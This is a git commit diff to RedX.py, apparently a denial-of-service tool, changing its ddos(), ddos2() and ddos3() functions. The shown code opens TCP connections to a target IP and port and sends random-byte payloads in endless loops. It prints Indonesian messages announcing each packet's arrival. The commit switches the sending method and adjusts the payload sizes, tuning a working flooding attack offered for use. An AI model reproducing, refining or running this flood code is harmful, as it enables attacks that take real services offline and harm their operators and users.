7f620d26a587248107e32394546351c97936f018
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-12-17 09:12:29 +0700

    Update RedX.py

--- RedX.py
+++ RedX.py
@@ -37,15 +37,16 @@ def ddos():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			addr = (str(ip),int(port))
+			s.connect((ip,port))
+			s.send(data)
 			for x in range(times):
-				s.sendto(data,addr)
+				s.send(data)
 			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
 		except:
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def ddos2():
-	data = random._urandom(65333)
+	data = random._urandom(1024)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -60,7 +61,7 @@ def ddos2():
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def ddos3():
-	data = random._urandom(1800)
+	data = random._urandom(16)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
